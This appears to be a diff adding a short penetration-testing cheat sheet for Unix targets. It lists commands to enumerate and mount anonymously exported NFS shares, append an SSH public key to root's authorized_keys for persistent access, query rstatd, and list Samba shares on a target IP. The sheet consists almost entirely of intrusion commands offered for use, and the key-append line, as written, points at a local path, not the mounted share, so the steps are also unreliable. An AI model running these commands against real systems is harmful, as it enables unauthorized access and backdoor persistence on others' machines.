@@ -1,0 +1,24 @@
+Unix
+
+
+# NFS Shares Anonymous Mountable
+
+rpcinfo -p <target-IP>	 Search for NFS shares.
+
+showmount -e <target-IP>
+
+mount -t nfs <target-IP>:/share /root/tmp/
+
+cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
+
+umount /root/tmp
+------------------------------------------------------------------------------------------------------
+
+# Rstatd enabled
+
+rsysinfo <target-IP>
+------------------------------------------------------------------------------------------------------
+
+# Samba with a writeable file share
+
+smbclient -L //<target-IP>
